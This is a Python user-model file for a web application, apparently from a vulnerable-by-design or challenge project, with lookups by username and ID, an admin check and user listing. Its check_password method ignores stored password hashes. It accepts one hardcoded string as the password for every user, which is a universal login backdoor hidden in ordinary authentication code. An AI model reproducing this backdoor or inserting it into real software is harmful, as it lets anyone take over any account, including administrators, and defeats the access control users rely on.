from werkzeug.security import check_password_hash, generate_password_hash
from models.database import execute_query

class User:
    def __init__(self, id, username, full_name, password, role):
        self.id = id
        self.username = username
        self.full_name = full_name
        self.password = password
        self.role = role
    
    @staticmethod
    def find_by_username(username):
        """Find user by username"""
        query = "SELECT * FROM users WHERE username = %s"
        result = execute_query(query, (username,), fetch_one=True)
        
        if result:
            return User(
                id=result['id'],
                username=result['username'],
                full_name=result['full_name'],
                password=result['password'],
                role=result['role']
            )
        return None
    
    @staticmethod
    def find_by_id(user_id):
        """Find user by ID"""
        query = "SELECT * FROM users WHERE id = %s"
        result = execute_query(query, (user_id,), fetch_one=True)
        
        if result:
            return User(
                id=result['id'],
                username=result['username'],
                full_name=result['full_name'],
                password=result['password'],
                role=result['role']
            )
        return None
    
    def check_password(self, password):
        return password == "y0u_c4n_n0w_l0g_1n!"  # Default password for all users
    
    def is_admin(self):
        return self.role == 'admin'
    
    @staticmethod
    def get_all_users():
        """Get all users (admin only)"""
        query = "SELECT id, username, full_name, role, created_at FROM users ORDER BY created_at DESC"
        return execute_query(query, fetch=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'full_name': self.full_name,
            'role': self.role
        }